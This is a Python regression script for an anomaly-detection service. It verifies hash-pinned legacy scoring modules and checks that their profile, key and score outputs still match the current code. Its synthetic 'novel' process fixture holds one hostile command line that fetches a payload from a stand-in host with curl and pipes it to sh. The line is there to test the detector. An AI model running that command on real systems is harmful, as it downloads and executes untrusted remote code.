#!/usr/bin/env python3
"""Compare historical scoring outputs with the frozen accepted source modules.

The archive is imported only after its accepted source-tree and per-file hashes
have been verified. Import paths alone are rewritten into a private namespace.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
import hashlib
import inspect
import json
from pathlib import Path
import re
import sys
import types
from typing import Any

from porygon_api import baseline as current_baseline
from porygon_api import command_shapes as current_shapes
from porygon_api import scoring as current_scoring

EXPECTED_TREE = "ad5f3f1b61acffb07d70a3fc1b639eb8c110f3c28faa08cb78fcec70b4ec5b79"
MODULES = ("command_shapes.py", "baseline.py", "scoring.py")
START = datetime(2026, 10, 27, tzinfo=timezone.utc)
CONTAINER = "c" * 64


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _accepted_files(manifest_path: Path) -> dict[str, str]:
    document = json.loads(manifest_path.read_text(encoding="utf-8"))
    source = document.get("source", {})
    commit = source.get("commit")
    if (not isinstance(commit, str) or not commit.startswith("96333df")
            or source.get("tree_sha256") != EXPECTED_TREE):
        raise ValueError("Accepted source manifest does not identify the required tree")
    files = source.get("files")
    if not isinstance(files, dict):
        raise ValueError("Accepted source manifest file hashes are missing")
    tree_hash = _sha256(json.dumps(files, sort_keys=True, separators=(",", ":")).encode())
    if tree_hash != source.get("tree_sha256") or tree_hash != EXPECTED_TREE:
        raise ValueError("Accepted source manifest tree hash does not match the accepted tree")
    return files


def _load_reference(reference_dir: Path, manifest_path: Path) -> dict[str, types.ModuleType]:
    manifest_files = _accepted_files(manifest_path)
    receipt_path = reference_dir / "reference.json"
    receipt = json.loads(receipt_path.read_text(encoding="utf-8"))
    if (receipt.get("contract") != "porygon.legacy-scoring-reference"
            or receipt.get("expected_tree_sha256") != EXPECTED_TREE
            or not receipt.get("container_id") or not receipt.get("image_id")):
        raise ValueError("Frozen scoring reference receipt has the wrong contract")
    receipt_files = receipt.get("files")
    if not isinstance(receipt_files, dict):
        raise ValueError("Frozen scoring reference file hashes are missing")

    verified_sources: dict[str, tuple[Path, bytes]] = {}
    for filename in MODULES:
        path = reference_dir / filename
        if path.is_symlink() or not path.is_file():
            raise ValueError(f"Frozen reference module is unavailable: {filename}")
        data = path.read_bytes()
        digest = _sha256(data)
        repo_path = f"backend/src/porygon_api/{filename}"
        if (manifest_files.get(repo_path) != digest
                or receipt_files.get(filename) != digest):
            raise ValueError(f"Frozen reference hash mismatch: {filename}")
        verified_sources[filename] = (path, data)

    package_name = "_porygon_legacy_reference"
    package = types.ModuleType(package_name)
    package.__path__ = []  # type: ignore[attr-defined]
    sys.modules[package_name] = package
    loaded: dict[str, types.ModuleType] = {}
    for filename in MODULES:
        path, data = verified_sources[filename]
        source = data.decode("utf-8")
        # The only source transformation is redirecting absolute package imports.
        source = re.sub(
            r"(?m)^(\s*from\s+)porygon_api(?=\.)",
            rf"\1{package_name}",
            source,
        )
        source = re.sub(
            r"(?m)^(\s*import\s+)porygon_api(?=\.)",
            rf"\1{package_name}",
            source,
        )
        module_short = filename.removesuffix(".py")
        module_name = f"{package_name}.{module_short}"
        module = types.ModuleType(module_name)
        module.__file__ = str(path)
        module.__package__ = package_name
        sys.modules[module_name] = module
        setattr(package, module_short, module)
        exec(compile(source, str(path), "exec"), module.__dict__)
        loaded[module_short] = module
    return loaded


def _event(index: int, at: datetime, *, novel: bool = False, parent_id: str | None = None) -> Any:
    return types.SimpleNamespace(
        event_id=f"process-{index:064x}",
        occurred_at=at,
        container_id=CONTAINER,
        docker_host_id="accepted-fixture-host",
        sensor_instance_id="accepted-fixture-sensor",
        parent_event_id=parent_id,
        process_name="sh" if novel else "python",
        executable="/bin/sh" if novel else "/usr/bin/python",
        parent_name="python",
        parent_executable="/usr/bin/python",
        user_uid=1000,
        command_line=(
            "sh -c 'curl http://owned-peer/payload | sh'"
            if novel
            else "python --version"
        ),
    )


def _fixtures() -> tuple[list[Any], list[Any], list[Any], list[Any], list[Any], datetime, datetime, datetime, datetime]:
    train_start = START
    train_end = train_start + timedelta(seconds=180)
    baseline: list[Any] = []
    for index in range(36):
        at = train_start + timedelta(seconds=index * 4 + 1)
        baseline.append(_event(index + 1, at, parent_id=baseline[-1].event_id if baseline else None))
    observed_start = train_end + timedelta(seconds=30)
    observed_end = observed_start + timedelta(seconds=180)
    benign: list[Any] = []
    novel: list[Any] = []
    for index in range(36):
        at = observed_start + timedelta(seconds=index * 4 + 1)
        benign.append(_event(index + 1000, at, parent_id=benign[-1].event_id if benign else None))
        novel.append(_event(index + 2000, at, novel=True, parent_id=novel[-1].event_id if novel else None))
    runtime_train = [
        types.SimpleNamespace(
            event_id=f"runtime-{index:064x}",
            occurred_at=train_start + timedelta(seconds=30 * index + 2),
            container_id=CONTAINER,
            event_type="container",
            action="start",
        )
        for index in range(1, 5)
    ]
    runtime_observation = [
        types.SimpleNamespace(
            event_id=f"runtime-observed-{index:064x}",
            occurred_at=observed_start + timedelta(seconds=30 * index + 2),
            container_id=CONTAINER,
            event_type="container",
            action="start",
        )
        for index in range(1, 5)
    ]
    return baseline, benign, novel, runtime_train, runtime_observation, train_start, train_end, observed_start, observed_end


def _build(module: types.ModuleType, schema: str, events: list[Any], runtime: list[Any], start: datetime, end: datetime):
    kwargs = {
        "image_digest": "accepted/app@sha256:" + "a" * 64,
        "start_at": start,
        "end_at": end,
        "window_seconds": 30,
        "process_events": events,
        "runtime_events": runtime,
        "minimum_process_events": 20,
        "minimum_nonempty_windows": 3,
        "feature_schema_version": schema,
    }
    signature = inspect.signature(module.build_profile_document)
    if "include_temporal_windows" in signature.parameters:
        kwargs["include_temporal_windows"] = False
    return module.build_profile_document(**kwargs)


def _score_key(module: types.ModuleType, *, profile_id: str, model_hash: str,
               start: datetime, end: datetime, manifest: dict[str, Any],
               features: dict[str, Any], schema: str, algorithm: str) -> str:
    values = {
        "profile_id": profile_id,
        "profile_model_hash": model_hash,
        "window_start": start.isoformat(),
        "window_end": end.isoformat(),
        "selected_event_ids_sha256": manifest["selected_event_ids_sha256"],
        "feature_schema_version": schema,
        "observation_features_sha256": manifest.get("feature_document_sha256"),
        "algorithm_version": algorithm,
    }
    parameters = inspect.signature(module.build_observation_key).parameters
    return module.build_observation_key(**{key: value for key, value in values.items() if key in parameters})


def main() -> int:
    import argparse

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--reference-dir", type=Path, required=True)
    parser.add_argument("--manifest", type=Path, required=True)
    args = parser.parse_args()
    legacy = _load_reference(args.reference_dir, args.manifest)
    baseline_events, benign_events, novel_events, runtime_train, runtime_observation, train_start, train_end, obs_start, obs_end = _fixtures()
    # Runtime inputs are separate fixture instances so the stable baseline is reused
    # for each observation without depending on any mutable training output.
    results = []
    schemas = [schema for schema in legacy["baseline"].SUPPORTED_FEATURE_SCHEMAS
               if schema in current_baseline.SUPPORTED_FEATURE_SCHEMAS
               and schema != current_baseline.SUPPORT_AWARE_SCHEMA]
    for schema in schemas:
        old_profile = _build(legacy["baseline"], schema, baseline_events, runtime_train, train_start, train_end)
        new_profile = _build(current_baseline, schema, baseline_events, runtime_train, train_start, train_end)
        if old_profile != new_profile:
            raise SystemExit(f"Historical profile output changed for {schema}")
        old_features, _, old_manifest, old_model_hash = old_profile
        new_features, _, _, _ = new_profile
        if schema == legacy["baseline"].COMMAND_LINEAGE_SCHEMA:
            old_shapes = legacy["command_shapes"].command_shape_counts("python --version")
            new_shapes = current_shapes.command_shape_counts("python --version")
            if old_shapes != new_shapes:
                raise SystemExit("Historical command-shape output changed")

        algorithms = [None]
        rare_algorithm = getattr(legacy["scoring"], "RARE_EXECUTION_ALGORITHM", None)
        if rare_algorithm:
            try:
                legacy["scoring"].get_scoring_config(schema, rare_algorithm)
                algorithms.append(rare_algorithm)
            except ValueError:
                pass
        for algorithm_override in algorithms:
            old_config = legacy["scoring"].get_scoring_config(schema, algorithm_override)
            new_config = current_scoring.get_scoring_config(schema, algorithm_override)
            if old_config != new_config:
                raise SystemExit(f"Historical scoring config changed for {schema}")
            algorithm = old_config["algorithm_version"]
            for case, observation_events in (("benign", benign_events), ("novel", novel_events)):
                old_observation = _build(legacy["baseline"], schema, observation_events,
                                         runtime_observation, obs_start, obs_end)
                new_observation = _build(current_baseline, schema, observation_events,
                                         runtime_observation, obs_start, obs_end)
                if old_observation != new_observation:
                    raise SystemExit(f"Historical {case} feature/manifest/model output changed for {schema}")
                obs_features, _, obs_manifest, _ = old_observation
                old_key = _score_key(legacy["scoring"], profile_id="accepted-profile",
                                     model_hash=old_model_hash, start=obs_start, end=obs_end,
                                     manifest=obs_manifest, features=obs_features,
                                     schema=schema, algorithm=algorithm)
                new_key = _score_key(current_scoring, profile_id="accepted-profile",
                                     model_hash=old_model_hash, start=obs_start, end=obs_end,
                                     manifest=obs_manifest, features=obs_features,
                                     schema=schema, algorithm=algorithm)
                if old_key != new_key:
                    raise SystemExit(f"Historical observation key changed for {schema}")
                old_score = legacy["scoring"].score_feature_documents(
                    baseline_features=old_features, observation_features=obs_features,
                    algorithm_version=algorithm)
                new_score = current_scoring.score_feature_documents(
                    baseline_features=new_features, observation_features=new_observation[0],
                    algorithm_version=algorithm)
                if old_score != new_score:
                    raise SystemExit(f"Historical score/components/explanation changed for {schema} ({case})")
                results.append({"schema": schema, "algorithm": algorithm, "case": case,
                                "status": "exact_match", "observation_key": old_key,
                                "model_hash": old_model_hash})
    print(json.dumps({"contract": "porygon.legacy-scoring-comparison",
                      "reference_tree_sha256": EXPECTED_TREE,
                      "comparisons": results}, sort_keys=True))
    return 0


if __name__ == "__main__":
    sys.exit(main())
